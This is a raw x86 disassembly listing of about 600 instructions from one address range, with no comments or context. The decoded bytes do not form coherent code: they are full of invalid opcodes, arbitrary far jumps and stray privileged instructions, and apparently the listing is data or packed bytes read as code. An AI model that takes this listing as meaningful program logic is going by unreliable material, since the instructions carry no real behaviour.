  401a8a:	and    al,0xc6
  401a8c:	shl    DWORD PTR [eax-0x50],cl
  401a8f:	cmp    BYTE PTR [esi+0x35db71a9],bh
  401a95:	sbb    eax,0x46f537a6
  401a9a:	lods   eax,DWORD PTR ds:[esi]
  401a9b:	mov    eax,0xd6aed01d
  401aa0:	add    eax,0xb6c1f814
  401aa5:	xchg   esi,eax
  401aa6:	mov    ebx,0x8e1cc6cc
  401aab:	pushf  
  401aac:	push   esp
  401aad:	xlat   BYTE PTR ds:[ebx]
  401aae:	mov    ds:0x2f191897,eax
  401ab3:	mov    edi,0x64fe341f
  401ab8:	push   0xa824f3e6
  401abd:	mov    edi,0x144b68b3
  401ac2:	les    esi,FWORD PTR [ebx-0x41]
  401ac5:	mov    gs,esi
  401ac7:	sub    al,0x29
  401ac9:	arpl   bp,ax
  401acb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401acc:	out    0x2c,al
  401ace:	jae    0x401a9f
  401ad0:	sub    BYTE PTR [edi+edx*2+0x365cf215],bl
  401ad7:	neg    DWORD PTR [ebp+0x2b]
  401ada:	outs   dx,WORD PTR ds:[esi]
  401adc:	imul   ebx,DWORD PTR [edi],0xffffffef
  401adf:	lea    eax,[esi]
  401ae1:	or     eax,DWORD PTR [edi]
  401ae3:	dec    esp
  401ae4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ae5:	fisttp WORD PTR [ecx]
  401ae7:	xchg   esp,eax
  401ae8:	sbb    BYTE PTR [esi+0x61370837],dl
  401aee:	(bad)  
  401aef:	test   al,0x63
  401af1:	fistp  QWORD PTR [edi]
  401af3:	add    BYTE PTR [ecx],dh
  401af5:	push   ebp
  401af6:	push   0x2d
  401af8:	jnp    0x401abe
  401afa:	retf   
  401afb:	cmp    dh,ah
  401afd:	(bad)  
  401afe:	jmp    0xbee4:0xfee01262
  401b05:	and    eax,0xffa2879
  401b0a:	(bad)  
  401b0b:	mov    ds:0xf0c3fcb6,al
  401b10:	das    
  401b11:	stos   BYTE PTR es:[edi],al
  401b12:	out    dx,al
  401b13:	adc    dl,ch
  401b15:	mov    esp,0x13d6256b
  401b1a:	in     al,dx
  401b1b:	jb     0x401b49
  401b1d:	dec    ebx
  401b1e:	jb     0x401b94
  401b20:	or     al,0x34
  401b22:	mov    eax,0x26f86f89
  401b27:	or     dh,BYTE PTR [ecx-0x3e6d512f]
  401b2d:	and    al,0x72
  401b2f:	ret    
  401b30:	cdq    
  401b31:	ds loop 0x401b96
  401b34:	mov    ebx,0xe64416c7
  401b39:	cwde   
  401b3a:	mov    eax,ds:0xa5eeb19d
  401b3f:	jecxz  0x401af9
  401b41:	les    eax,FWORD PTR [eax]
  401b43:	das    
  401b44:	push   0x7d
  401b46:	fdivr  QWORD PTR [eax-0x21]
  401b49:	mov    ecx,0x49f2330f
  401b4e:	cli    
  401b4f:	cs pop ds
  401b51:	mov    eax,ds:0x8b526849
  401b56:	jge    0x401bb1
  401b58:	inc    DWORD PTR [esi+0x21]
  401b5b:	fst    QWORD PTR [ebx+0xd029899]
  401b61:	cmp    al,0xad
  401b63:	mov    bh,0x9
  401b65:	push   esp
  401b66:	shl    DWORD PTR [ecx+eax*2+0x5c03fd1c],1
  401b6d:	mov    al,ds:0x95e15e4d
  401b72:	pop    ds
  401b73:	nop
  401b74:	stos   DWORD PTR es:[edi],eax
  401b75:	jnp    0x401af8
  401b77:	adc    DWORD PTR [edx-0x664ffc04],0xffffffe6
  401b7e:	das    
  401b7f:	dec    esi
  401b80:	adc    DWORD PTR [edx+eax*1],edx
  401b83:	js     0x401b5d
  401b85:	popf   
  401b86:	mov    edi,DWORD PTR [edx+0x4e34d02c]
  401b8c:	xchg   edi,eax
  401b8d:	clc    
  401b8e:	sub    DWORD PTR cs:[eax-0x59],esp
  401b92:	pop    ds
  401b93:	add    eax,0x5fabac89
  401b98:	push   eax
  401b99:	shr    DWORD PTR [eax],cl
  401b9b:	ret    
  401b9c:	pop    ds
  401b9d:	pushf  
  401b9e:	jbe    0x401b6a
  401ba0:	push   es
  401ba1:	fwait
  401ba2:	adc    al,0x7e
  401ba4:	cmp    eax,0xb72ddfd0
  401ba9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401baa:	inc    ebp
  401bab:	sub    ah,cl
  401bad:	jo     0x401bd1
  401baf:	pop    ss
  401bb0:	mov    ebx,0x4278b83
  401bb5:	arpl   dx,dx
  401bb7:	jge    0x401b3a
  401bb9:	xchg   ebp,eax
  401bba:	test   al,0x82
  401bbc:	pop    eax
  401bbd:	jmp    0x401b5e
  401bbf:	push   edi
  401bc0:	jbe    0x401c3d
  401bc2:	mov    ebp,0x67370556
  401bc7:	mov    edi,0xbbc04f5b
  401bcc:	pusha  
  401bcd:	adc    eax,0xfafd8669
  401bd2:	jge    0x401b9c
  401bd4:	sub    DWORD PTR [esi-0x67],ebp
  401bd7:	push   cs
  401bd8:	adc    eax,0xe20f97eb
  401bdd:	imul   bl
  401bdf:	jp     0x401c1a
  401be1:	push   ds
  401be2:	cld    
  401be3:	adc    ebx,edi
  401be5:	rcr    BYTE PTR ds:0x8a054698,1
  401beb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bec:	jg     0x401bc6
  401bee:	outs   dx,BYTE PTR ds:[esi]
  401bef:	or     BYTE PTR [edi+eiz*1-0x4f14fea2],al
  401bf6:	pop    ebx
  401bf7:	hlt    
  401bf8:	das    
  401bf9:	mov    fs,WORD PTR [esi]
  401bfb:	pop    ss
  401bfc:	retf   
  401bfd:	xor    BYTE PTR [ecx],bl
  401bff:	pop    ebp
  401c00:	sub    dl,BYTE PTR [edx-0x6db8eebd]
  401c06:	out    dx,al
  401c07:	repz jmp 0xeb34:0x75f85fe4
  401c0f:	lock xchg esi,eax
  401c11:	dec    ebx
  401c12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c13:	cmp    DWORD PTR [ebx-0x233c33],ebx
  401c19:	arpl   bp,cx
  401c1b:	fnsave [ecx+eax*1]
  401c1e:	inc    ebp
  401c1f:	jmp    0x1077:0xd7b55023
  401c26:	loopne 0x401c0c
  401c28:	xor    esi,DWORD PTR [edi-0xc]
  401c2b:	mov    edi,0xfb6f6ceb
  401c30:	add    ecx,DWORD PTR [edx]
  401c32:	aas    
  401c33:	push   esp
  401c34:	or     cl,ch
  401c36:	pop    eax
  401c37:	dec    eax
  401c38:	(bad)
  401c3b:	data16 (bad) 
  401c3d:	jbe    0x401c10
  401c3f:	arpl   WORD PTR [esi-0x236677da],bx
  401c45:	sbb    DWORD PTR [ebx+0x7e],ebx
  401c48:	sub    DWORD PTR [edx],ebp
  401c4a:	mov    bh,0xca
  401c4c:	xchg   edx,eax
  401c4d:	mov    ebp,0x782ca
  401c52:	xchg   DWORD PTR [edx],edi
  401c54:	sub    BYTE PTR [ebx+0x73],0xd8
  401c58:	adc    BYTE PTR [ebx+0x9630c83],0x20
  401c5f:	fcomp  QWORD PTR [edx-0x1e]
  401c62:	mov    eax,ds:0xac928f35
  401c67:	mov    esi,0x34dfbb1d
  401c6c:	dec    ebx
  401c6d:	add    al,0xa8
  401c6f:	and    al,0xc5
  401c71:	lds    esi,FWORD PTR [eax-0x449f0837]
  401c77:	sub    bh,bh
  401c79:	xchg   ecx,eax
  401c7a:	sub    ebp,DWORD PTR [ecx]
  401c7c:	or     eax,0x2ec45fe8
  401c81:	xchg   ecx,eax
  401c82:	pop    ebx
  401c83:	ds jg  0x401c4c
  401c86:	jno    0x401c33
  401c88:	mov    fs,ebp
  401c8a:	sbb    eax,0xa60bb208
  401c8f:	dec    ebx
  401c90:	popa   
  401c91:	push   ebp
  401c92:	dec    ecx
  401c93:	(bad)  
  401c94:	mov    dl,0xd1
  401c96:	cmp    al,0x86
  401c98:	adc    BYTE PTR [edi-0x42e16c0f],dl
  401c9e:	and    al,0x32
  401ca0:	cld    
  401ca1:	and    BYTE PTR [eax-0x3d],al
  401ca4:	push   ebx
  401ca5:	mov    ebx,0x99e2ff05
  401caa:	add    bh,0xba
  401cad:	xchg   esp,eax
  401cae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401caf:	or     edi,DWORD PTR [eax+eiz*4-0x741b0604]
  401cb6:	xor    al,0xbc
  401cb8:	cdq    
  401cb9:	shl    DWORD PTR [eax],1
  401cbb:	mov    al,0x4f
  401cbd:	jne    0x401ce1
  401cbf:	aam    0x3b
  401cc1:	xor    eax,0x7b56d6bb
  401cc6:	and    bl,BYTE PTR [ebx+0x4b]
  401cc9:	xchg   DWORD PTR [eax-0x64],ecx
  401ccc:	les    ecx,FWORD PTR [ebx]
  401cce:	cmc    
  401ccf:	push   edx
  401cd0:	mov    esi,0xacc8e94b
  401cd5:	arpl   bp,si
  401cd7:	mov    BYTE PTR [ebp-0x48],cl
  401cda:	aam    0xff
  401cdc:	and    DWORD PTR [ebp-0x4ffaf509],0xb9c7c4a3
  401ce6:	pop    esp
  401ce7:	jo     0x401ca7
  401ce9:	outs   dx,BYTE PTR ds:[esi]
  401cea:	sub    BYTE PTR [ebp+0x566f5a3f],dl
  401cf0:	dec    ebp
  401cf1:	push   es
  401cf2:	pop    ss
  401cf3:	(bad)  
  401cf5:	sbb    BYTE PTR [esi-0x2d],cl
  401cf8:	aaa    
  401cf9:	jmp    FWORD PTR [ebx+0x35]
  401cfc:	pushf  
  401cfd:	and    DWORD PTR [esi],ebx
  401cff:	sbb    edi,edx
  401d01:	dec    eax
  401d02:	repnz adc al,0xe9
  401d05:	inc    BYTE PTR [edi-0x28]
  401d08:	dec    eax
  401d09:	loopne 0x401cbc
  401d0b:	dec    edx
  401d0c:	test   DWORD PTR [ebp-0x13],0x9bb9019f
  401d13:	sub    esi,ecx
  401d15:	cdq    
  401d16:	adc    esi,edi
  401d18:	or     bh,BYTE PTR [eax+0x8]
  401d1b:	icebp  
  401d1c:	xor    BYTE PTR [esi+ebx*4-0x1d3afe6],dl
  401d23:	adc    bl,BYTE PTR [esi+0xc6d5e18]
  401d29:	call   0x136a:0xde626b5b
  401d30:	fmul   QWORD PTR [eax-0x35]
  401d33:	ins    DWORD PTR es:[edi],dx
  401d34:	inc    ebp
  401d35:	dec    esi
  401d36:	pushf  
  401d37:	adc    al,0xf5
  401d39:	ficom  DWORD PTR [edx]
  401d3b:	push   edx
  401d3c:	mov    WORD PTR [edx],ds
  401d3e:	lahf   
  401d3f:	pushf  
  401d40:	xchg   ecx,eax
  401d41:	mov    edi,0x87a1fb10
  401d46:	inc    eax
  401d47:	push   es
  401d48:	add    DWORD PTR [ecx+eax*2+0x48211a18],ecx
  401d4f:	sbb    BYTE PTR ds:0xa73445a9,al
  401d55:	or     DWORD PTR [eax+eax*1+0x63d115c4],ecx
  401d5c:	dec    eax
  401d5d:	and    BYTE PTR [eax-0x124aaeb7],dh
  401d63:	int    0xf3
  401d65:	mov    edi,0x9bf3ea09
  401d6a:	dec    esp
  401d6b:	js     0x401d0a
  401d6d:	mov    ebx,0x2de75a7d
  401d72:	jg     0x401d2f
  401d74:	xchg   BYTE PTR [ecx+0x24],dl
  401d77:	pop    edx
  401d78:	punpckhbw mm7,QWORD PTR [edx]
  401d7b:	add    BYTE PTR [esi-0x3b],dl
  401d7e:	push   eax
  401d7f:	or     eax,0x13be3120
  401d84:	push   ebx
  401d85:	and    eax,0x9f389243
  401d8a:	ss sbb al,0x3b
  401d8d:	(bad)  
  401d8e:	mov    ecx,0x5e4976bc
  401d93:	ds cwde 
  401d95:	outs   dx,DWORD PTR ds:[esi]
  401d96:	mov    BYTE PTR [ebp+0x6ac07a35],cl
  401d9c:	push   edi
  401d9d:	pop    ebx
  401d9e:	fmul   QWORD PTR ds:0xe41519c2
  401da4:	pop    ds
  401da5:	stos   DWORD PTR es:[edi],eax
  401da6:	dec    ebx
  401da7:	or     ebx,ecx
  401da9:	adc    ebp,DWORD PTR [ecx-0x14693605]
  401daf:	mov    ds:0x986beb65,al
  401db4:	push   esi
  401db5:	jnp    0x401e27
  401db7:	mov    dh,0x1b
  401db9:	push   ds
  401dba:	jmp    0x7bbaf95c
  401dbf:	mov    bh,0xa3
  401dc1:	gs enter 0xd54b,0x8a
  401dc6:	aas    
  401dc7:	xor    edi,0x4fee94de
  401dcd:	in     al,dx
  401dce:	xchg   BYTE PTR [edx+0x73d3afbc],bl
  401dd4:	pop    eax
  401dd5:	push   ebx
  401dd6:	xor    ebp,ebx
  401dd8:	push   esp
  401dd9:	sbb    eax,0x7c381239
  401dde:	gs test al,0xcf
  401de1:	outs   dx,BYTE PTR ds:[esi]
  401de2:	arpl   WORD PTR [edx+0x1e93115c],ax
  401de8:	xchg   esi,eax
  401de9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401dea:	adc    ch,BYTE PTR [ebp+0x35667fb2]
  401df0:	add    ebp,DWORD PTR [ebx]
  401df2:	jmp    0x5431:0x24b7ebf5
  401df9:	mov    eax,ds:0x842d9837
  401dfe:	or     eax,0x1c5c6f89
  401e03:	test   eax,0xbd3bd2
  401e08:	add    al,0x3b
  401e0a:	mov    cs,WORD PTR [esi-0x46]
  401e0d:	cld    
  401e0e:	and    DWORD PTR [edx+0x18],edi
  401e11:	cmp    BYTE PTR ds:0xe2931242,bh
  401e17:	out    0xda,al
  401e19:	xchg   esi,eax
  401e1a:	shl    BYTE PTR [edi+0x7c],cl
  401e1d:	xchg   ecx,eax
  401e1e:	xor    DWORD PTR [ebx],edx
  401e20:	test   eax,0xb0627be2
  401e25:	mul    DWORD PTR [eax]
  401e27:	jb     0x401df7
  401e29:	aad    0xe3
  401e2b:	and    ebx,DWORD PTR [esi+0x470d3d3f]
  401e31:	and    BYTE PTR [ecx],cl
  401e33:	es jl  0x401e58
  401e36:	loopne 0x401ea6
  401e38:	addr16 jge 0x401e43
  401e3b:	retf   
  401e3c:	repz in eax,0x87
  401e3f:	in     al,0x1b
  401e41:	clc    
  401e42:	inc    ebx
  401e43:	mov    esi,DWORD PTR [ecx]
  401e45:	push   cs
  401e46:	(bad)  
  401e47:	hlt    
  401e48:	jno    0x401eaf
  401e4a:	leave  
  401e4b:	mov    edx,DWORD PTR [ebx+0x76]
  401e4e:	lods   eax,DWORD PTR ds:[esi]
  401e4f:	(bad)  
  401e50:	and    eax,DWORD PTR [esi]
  401e52:	imul   edi,DWORD PTR [ebx+0x17],0xe1cbbdc
  401e59:	outs   dx,BYTE PTR ds:[esi]
  401e5a:	push   edi
  401e5b:	test   eax,0x4dc07b2
  401e60:	fcomip st,st(0)
  401e62:	addr16 clc 
  401e64:	je     0x401e8e
  401e66:	cmp    dl,cl
  401e68:	clc    
  401e69:	test   DWORD PTR [eax-0x6bbf45aa],ebp
  401e6f:	sub    bl,bh
  401e71:	push   cs
  401e72:	fcom   QWORD PTR [ebp-0x3d]
  401e75:	mov    ds:0x60c4b317,al
  401e7a:	cmp    al,0x25
  401e7c:	add    eax,0x95befe94
  401e81:	mov    ds:0x62acfdf7,al
  401e86:	add    dh,dl
  401e88:	xor    al,0xa1
  401e8a:	sbb    DWORD PTR [edx-0xafeb89e],ecx
  401e90:	cmp    DWORD PTR [ebp+ebx*1+0x5b2b1f42],edi
  401e97:	out    dx,eax
  401e98:	push   ebp
  401e99:	test   eax,0xab604cfa
  401e9e:	xchg   edx,eax
  401e9f:	test   DWORD PTR [esi+eiz*8+0x6e9f080f],0x676d7d9e
  401eaa:	cld    
  401eab:	fwait
  401eac:	test   al,0x9
  401eae:	ret    0x798d
  401eb1:	rcl    DWORD PTR ds:0x76a99206,cl
  401eb7:	cmp    ebx,DWORD PTR [ebp-0x4d8c2c81]
  401ebd:	xor    DWORD PTR [ecx],esp
  401ebf:	test   BYTE PTR [edx],cl
  401ec1:	xchg   esi,eax
  401ec2:	pop    ebx
  401ec3:	mov    BYTE PTR [ebx-0x2d1677d5],bl
  401ec9:	retf   0x2279
  401ecc:	je     0x401e60
  401ece:	(bad)  
  401ecf:	sub    al,0x42
  401ed1:	mov    ds:0x97bd0a9e,eax
  401ed6:	mov    ah,0x73
  401ed8:	mov    al,BYTE PTR [esi-0x35]
  401edb:	lods   al,BYTE PTR ds:[esi]
  401edc:	mov    ch,0xc4
  401ede:	inc    edi
  401edf:	or     BYTE PTR [esi],cl
  401ee1:	inc    ecx
  401ee2:	push   es
  401ee3:	xor    eax,0x9c9c5837
  401ee8:	scas   al,BYTE PTR es:[edi]
  401ee9:	fdivr  st(3),st
  401eeb:	add    dh,0x9f
  401eee:	ficom  DWORD PTR [edx+edx*1+0x4e1c9947]
  401ef5:	mov    ch,0xe0
  401ef7:	loop   0x401f46
  401ef9:	adc    al,0x66
  401efb:	shl    BYTE PTR [ebx-0x2d],1
  401efe:	dec    eax
  401eff:	inc    esi
  401f00:	jg     0x401f6b
  401f02:	jmp    0xed9857c9
  401f07:	mov    WORD PTR ds:0xd27ebbeb,ss
  401f0d:	pushf  
  401f0e:	jp     0x401ee0
  401f10:	inc    edi
  401f11:	stc    
  401f12:	leave  
  401f13:	fxch   st(6)
  401f15:	jge    0x401f89
  401f17:	out    dx,al
  401f18:	cdq    
  401f19:	adc    al,0x72
  401f1b:	addr16 dec ecx
  401f1d:	fs inc esp
  401f1f:	mov    ch,0x7e
  401f21:	leave  
  401f22:	cli    
  401f23:	dec    edi
  401f24:	retf   0xbcc9
  401f27:	cmc    
  401f28:	jmp    0xd978:0x3e74eda3
  401f2f:	loopne 0x401f0f
  401f31:	and    edx,DWORD PTR [ebx]
  401f33:	pop    ebx
  401f34:	push   esp
  401f35:	dec    esp
  401f36:	sub    DWORD PTR [ebp+eax*8+0x67],0x30
  401f3b:	add    dh,dh
  401f3d:	mov    ebx,0xb105584a
  401f42:	mov    BYTE PTR [eax],cl
  401f44:	or     DWORD PTR [eax],ebx
  401f46:	xchg   edx,eax
  401f47:	xchg   edi,eax
  401f48:	lds    edx,FWORD PTR [edx-0xf]
  401f4b:	push   cs
  401f4c:	mov    ds:0x4a34474,eax
  401f51:	xchg   edx,eax
  401f52:	call   0xba15d814
  401f57:	and    al,0xce
  401f59:	hlt    
  401f5a:	mov    ah,0xab
  401f5c:	mov    DWORD PTR [eax+0x5f07de57],0x2a75596b
  401f66:	imul   DWORD PTR [eax+0x1cfd00ef]
  401f6c:	div    BYTE PTR [ebp-0x7583ed36]
  401f72:	inc    ecx
  401f73:	jo     0x401f15
  401f75:	loopne 0x401f22
  401f77:	pop    es
  401f78:	mov    esp,DWORD PTR [edx-0x1d]
  401f7b:	fisubr DWORD PTR [ecx-0x6d]
  401f7e:	or     esp,DWORD PTR [edx+0x7d16beb9]
  401f84:	adc    DWORD PTR [esp+eiz*4-0x14],eax
  401f88:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f8a:	fcomi  st,st(3)
  401f8c:	aas    
  401f8d:	or     DWORD PTR [esi],eax
  401f8f:	fcom   st(3)
  401f91:	nop
  401f92:	test   DWORD PTR ss:[edx-0x6b],0x36cfebfd
  401f9a:	into   
  401f9b:	mov    al,BYTE PTR [ebx-0x79]
  401f9e:	test   eax,0x8e623467
  401fa3:	dec    esp
  401fa4:	jmp    FWORD PTR [esi+0x2a]
  401fa7:	icebp  
  401fa8:	jno    0x401fb4
  401faa:	sub    eax,0x5f35fc39
  401faf:	int3   
  401fb0:	cmp    DWORD PTR [ebp+0x59],ebx
  401fb3:	cli    
  401fb4:	ret    
  401fb5:	xor    cl,BYTE PTR [ebp+0x41194d9f]
  401fbb:	enter  0xa550,0x0
  401fbf:	dec    eax
  401fc0:	jmp    0x1b71:0xfec3afc2
  401fc7:	push   ss
  401fc8:	jae    0x402029
  401fca:	adc    BYTE PTR [ebx],bl
  401fcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fcd:	les    esp,FWORD PTR [ebp-0x7a7f6429]
  401fd3:	ins    BYTE PTR es:[edi],dx
  401fd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fd5:	fwait
  401fd6:	not    ebx
  401fd8:	data16 and BYTE PTR [edx+ecx*2],dh
  401fdc:	mov    eax,ds:0x47919676
  401fe1:	ja     0x401f93
  401fe3:	dec    edx
  401fe4:	xor    esp,DWORD PTR [ecx+0x21]
  401fe7:	and    bh,BYTE PTR [ebx+ecx*2]
  401fea:	or     cl,BYTE PTR [ecx]
  401fec:	clc    
  401fed:	pop    eax
  401fee:	jl     0x40201a
  401ff0:	js     0x401f8b
  401ff2:	popa   
  401ff3:	xchg   esi,eax
  401ff4:	js     0x401fec
  401ff6:	push   esi
  401ff7:	push   esp
  401ff8:	ins    BYTE PTR es:[edi],dx
  401ff9:	xor    al,0xe5
  401ffb:	cmp    edi,ebp
  401ffd:	add    ebx,ebp
  401fff:	pop    ecx
  402000:	cli    
  402001:	cwde   
  402002:	sar    DWORD PTR [ecx],0xdd
  402005:	enter  0xc769,0xde
  402009:	push   eax
  40200a:	mov    DWORD PTR [ecx+0x7a93285b],edx
  402010:	shl    DWORD PTR [esi-0x33],cl
  402013:	jmp    0x2ba5cd98
  402018:	or     DWORD PTR [ebx],ebx
  40201a:	pop    esi
  40201b:	icebp  
  40201c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40201d:	mov    esp,0x8cf15ed8
  402022:	sti    
  402023:	dec    esi
  402024:	xchg   ebx,eax
  402025:	pop    ecx
  402026:	loopne 0x401fac
  402028:	push   esp
  402029:	in     al,dx
  40202a:	bound  ecx,QWORD PTR [edx-0x20ae24af]
  402030:	xor    al,0x55
  402032:	imul   ebp,DWORD PTR [esi],0x9033a8be
  402038:	fldenv [edx+ebx*8-0x5e]
  40203c:	jecxz  0x401fcd
  40203e:	and    eax,0xf7f60c54
  402043:	ins    DWORD PTR es:[edi],dx
  402044:	inc    edx
  402045:	popf   
  402046:	jnp    0x401fe8
  402048:	loope  0x401fea
  40204a:	pop    ds
  40204b:	xor    DWORD PTR [ebp+eiz*1+0x26b4914],esp
  402052:	adc    edx,DWORD PTR [eax-0x48]
  402055:	sub    al,0xa9
  402057:	fdiv   DWORD PTR [edi+0x30]
  40205a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40205b:	and    BYTE PTR [ebp+0x38d7452],0x94
  402062:	inc    ebx
  402063:	les    ebp,FWORD PTR ds:0x3ce9b95e
  402069:	out    0x5,eax
  40206b:	xchg   ecx,eax
  40206c:	jb     0x402097
  40206e:	sub    DWORD PTR [edx+eax*2+0x5c52c9e7],edx
  402075:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402076:	xchg   edi,eax
  402077:	pop    ds
  402078:	sub    eax,0x86a449ba
  40207d:	jmp    DWORD PTR [edi+0x6cbef45d]
  402083:	add    edx,DWORD PTR [ecx+0x2c]
  402086:	adc    eax,DWORD PTR [ecx+0x6bf559da]
  40208c:	leave  
  40208d:	mov    BYTE PTR [edi-0x15],dl
  402090:	aad    0xe
  402092:	mov    al,0xce
  402094:	jns    0x4020e7
  402096:	and    ebx,ebx
  402098:	dec    ecx
  402099:	mov    DWORD PTR [ebx+esi*8-0x68b28fb9],esp
  4020a0:	fisubr DWORD PTR [ebp-0x2f99db22]
  4020a6:	sub    DWORD PTR [ebp+0x389ba495],0x5ab1ec27
  4020b0:	das    
  4020b1:	das    
  4020b2:	and    BYTE PTR [edx],al
  4020b4:	std    
  4020b5:	out    dx,al
  4020b6:	jbe    0x402053
  4020b8:	in     al,dx
  4020b9:	lds    ebx,FWORD PTR [esi-0x2]
  4020bc:	inc    edi
  4020bd:	ds jmp 0x7b8eb3eb
  4020c3:	mov    esi,0x85871189
  4020c8:	aaa    
  4020c9:	or     cl,BYTE PTR [ecx+0x4e]
  4020cc:	loopne 0x402083
  4020ce:	pop    esi
  4020cf:	add    eax,0x3b5a922e
  4020d4:	cli    
  4020d5:	aaa    
  4020d6:	push   0x9
  4020d8:	repz push esi
  4020da:	cmp    ebp,DWORD PTR [ebx]
  4020dc:	aad    0xf6
  4020de:	jg     0x4020cd
  4020e0:	sub    BYTE PTR [esi],cl
  4020e2:	pop    ds
  4020e3:	push   esi
  4020e4:	add    dh,BYTE PTR [edi]
  4020e6:	aad    0xda
  4020e8:	into   
  4020e9:	inc    eax
  4020ea:	loope  0x40214e
  4020ec:	cmp    eax,0x18078356
  4020f1:	shld   DWORD PTR [edx+0x3684602b],esp,cl
  4020f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020f9:	sbb    DWORD PTR [esi],0xfe543cff
  4020ff:	jo     0x4020a5
  402101:	jns    0x4020ae
  402103:	cmp    BYTE PTR [ecx+eax*8+0x6a],0xb6
  402108:	mov    eax,0xa64a8f71
  40210d:	adc    al,0xe4
  40210f:	push   ebp
  402110:	mov    dl,BYTE PTR [edx-0x5dc12ca8]
  402116:	xor    BYTE PTR [ebx+0x19],0x66
  40211a:	adc    edi,ebp
  40211c:	push   esp
  40211d:	and    eax,ecx
  40211f:	mov    ebx,0xb5461423
  402124:	push   0xffffffa6
  402126:	xor    DWORD PTR [ebp-0x237be44a],0xffffffb5
  40212d:	add    al,0x80
  40212f:	(bad)  
  402130:	popf   
  402131:	cmc    
  402132:	sbb    eax,0x5abb2e01
  402137:	enter  0x979d,0x4d
  40213b:	hlt    
  40213c:	sahf   
  40213d:	mov    dh,0x58
  40213f:	jnp    0x402153
  402141:	popa   
  402142:	std    
  402143:	mov    esi,0xfc7b3c2a
  402148:	jmp    0x4020f8
  40214a:	cmp    eax,0xedf8321
  40214f:	pop    ss
  402150:	dec    esp
  402151:	mov    ds:0x4de22b1d,eax
  402156:	call   0x597c:0xf545b014
  40215d:	(bad)  
  40215e:	jle    0x402100
  402160:	scas   al,BYTE PTR es:[edi]
  402161:	mov    gs,WORD PTR [ebx+0x2b]
  402164:	cmp    ebx,edx
  402166:	arpl   WORD PTR [edx+eiz*1],bp
  402169:	stc    
  40216a:	stos   BYTE PTR es:[edi],al
  40216b:	push   es
  40216c:	fisttp QWORD PTR [eax-0x7b]
  40216f:	aam    0x75
  402171:	sahf   
  402172:	fld    QWORD PTR [eax-0x71]
  402175:	dec    eax
  402177:	mov    ah,cl
  402179:	repnz sub BYTE PTR [ecx],bh
  40217c:	mov    bl,0xdd
  40217e:	aad    0x9c
  402180:	inc    edx
  402181:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402182:	int    0x10
  402184:	lahf   
  402185:	or     al,0xdf
  402187:	pop    edx
  402188:	(bad)  
  402189:	cwde   
  40218a:	lods   eax,DWORD PTR ds:[esi]
  40218b:	jg     0x402184
  40218d:	lods   eax,DWORD PTR ds:[esi]
  40218e:	aad    0xfd
  402190:	xlat   BYTE PTR ds:[ebx]
  402191:	ins    DWORD PTR es:[edi],dx
  402192:	jno    0x402118
  402194:	and    DWORD PTR [ecx+0x0],ecx
  402197:	outs   dx,DWORD PTR ds:[esi]
  402198:	add    cl,bl
  40219a:	add    DWORD PTR [ebx-0x60aed314],eax
  4021a0:	mov    bh,0x76
  4021a2:	inc    esi
  4021a3:	pop    edx
  4021a4:	dec    ecx
  4021a5:	(bad)  
  4021a6:	mov    esi,0x71acd445
  4021ab:	inc    ebx
  4021ac:	and    al,0x29
  4021ae:	sub    esi,DWORD PTR [edi]
  4021b0:	cmp    BYTE PTR [edx],al
  4021b2:	scas   al,BYTE PTR es:[edi]
  4021b3:	push   ebp
  4021b4:	mov    ah,al
  4021b6:	mov    ebp,0xe70af02d
  4021bb:	adc    eax,0x5a404759
  4021c0:	mov    esp,0x34a05852
  4021c5:	test   BYTE PTR [ebx-0x27d5e926],ch
  4021cb:	inc    esi
  4021cc:	int    0x4b
  4021ce:	inc    eax
  4021cf:	cli    
  4021d0:	fwait
  4021d1:	mov    bl,0xef
  4021d3:	or     eax,esp
  4021d5:	out    dx,al
  4021d6:	leave  
  4021d7:	enter  0xc972,0x23
  4021db:	xchg   ebp,eax
  4021dc:	mov    ah,0xe4
  4021de:	in     eax,dx
  4021df:	xor    eax,0x37458310
  4021e4:	cmp    cl,bl
  4021e6:	lahf   
  4021e7:	loop   0x40222e
  4021e9:	ins    BYTE PTR es:[edi],dx
  4021ea:	adc    ecx,edi
  4021ec:	ins    DWORD PTR es:[edi],dx
  4021ed:	fisttp QWORD PTR [edi-0x64]
  4021f0:	fiadd  WORD PTR [ebp+edx*1-0x67]
  4021f4:	pusha  
  4021f5:	shl    DWORD PTR [eax-0x68b38362],cl
  4021fb:	sbb    al,0x25
  4021fd:	test   DWORD PTR [ebp+0x52912df2],ebp
  402203:	mov    ecx,0x1d9113
  402208:	jecxz  0x402221
  40220a:	retf   0xe191
  40220d:	inc    ebp
  40220e:	cs popa 
  402210:	pop    edx
  402211:	xlat   BYTE PTR ds:[ebx]
  402212:	and    BYTE PTR [edx],0x72
  402215:	les    ebx,FWORD PTR [edi+0x4115857e]
  40221b:	mov    dl,0xd0
  40221d:	dec    ecx
  40221e:	jle    0x402295
  402220:	hlt    
  402221:	mov    eax,ds:0xd83c5ab
  402226:	inc    BYTE PTR [edx+0x29536098]
  40222c:	pop    esp
  40222d:	adc    esp,DWORD PTR [ebp+eax*2-0x3d]
  402231:	mov    ebx,0xe45c4057
  402236:	jecxz  0x40221f
  402238:	pop    ss
  402239:	adc    cl,BYTE PTR [edi+ebp*1]
  40223c:	or     edx,edx
  40223e:	mov    BYTE PTR [ebx+0x12],ch
  402241:	mov    esi,0x13d7c178
  402246:	or     ebp,DWORD PTR [esi]
  402248:	jae    0x40229f
  40224a:	dec    ebp
  40224b:	ror    DWORD PTR [ebp+0x20346d88],cl
  402251:	out    0x53,al
  402253:	mov    ch,0x0
  402255:	cmp    al,0x61
  402257:	mov    dl,0x1b
  402259:	scas   eax,DWORD PTR es:[edi]
